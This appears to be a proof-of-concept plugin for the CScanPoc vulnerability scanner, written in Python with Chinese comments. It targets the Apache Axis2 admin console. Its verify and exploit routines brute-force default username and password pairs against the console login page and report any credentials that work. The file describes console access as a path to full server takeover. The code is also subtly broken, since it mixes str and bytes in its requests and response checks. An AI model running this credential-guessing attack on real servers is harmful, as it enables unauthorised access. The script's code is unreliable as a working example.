# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Apache-Axis2_0006'  # 平台漏洞编号
    name = 'Apache-Axis2控制台弱口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = '2015-08-31'  # 漏洞公布时间
    desc = '''
        攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。
    '''  # 漏洞描述
    ref = 'http://www.codesec.net/view/247352.html'  # http://www.codesec.net/view/247352.html
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Apache-Axis2'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'add2edf3-2e56-42c6-aeff-15b79d40ad78'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            error_i = 0
            url = '{target}'.format(target=self.target)
            res = urllib.request.urlopen(
                url + '/axis2/services/listServices', timeout=timeout)
            flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                         'include page="footer.inc">', 'axis2-admin/logout']
            user_list = ['axis', 'admin', 'root']
            PASSWORD_DIC = ['axis2', 'axis', 'admin', 'root', 'P@ssw0rd']
            for user in user_list:
                for password in PASSWORD_DIC:
                    try:
                        login_url = url + '/axis2/axis2-admin/login'
                        PostStr = 'userName=%s&password=%s&submit=+Login+' % (
                            user, password)
                        request = urllib.request.Request(login_url, PostStr)
                        res = urllib.request.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib.error.HTTPError as e:
                        return
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            error_i = 0
            url = '{target}'.format(target=self.target)
            res = urllib.request.urlopen(
                url + '/axis2/services/listServices', timeout=timeout)
            flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                         'include page="footer.inc">', 'axis2-admin/logout']
            user_list = ['axis', 'admin', 'root']
            PASSWORD_DIC = ['axis2', 'root', 'admin',
                            '123456', 'P@ssw0rd', 'password']
            for user in user_list:
                for password in PASSWORD_DIC:
                    try:
                        login_url = url + '/axis2/axis2-admin/login'
                        PostStr = 'userName=%s&password=%s&submit=+Login+' % (
                            user, password)
                        request = urllib.request.Request(login_url, PostStr)
                        res = urllib.request.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib.error.HTTPError as e:
                        return
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(
                                target=self.target, name=self.vuln.name, username=user, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
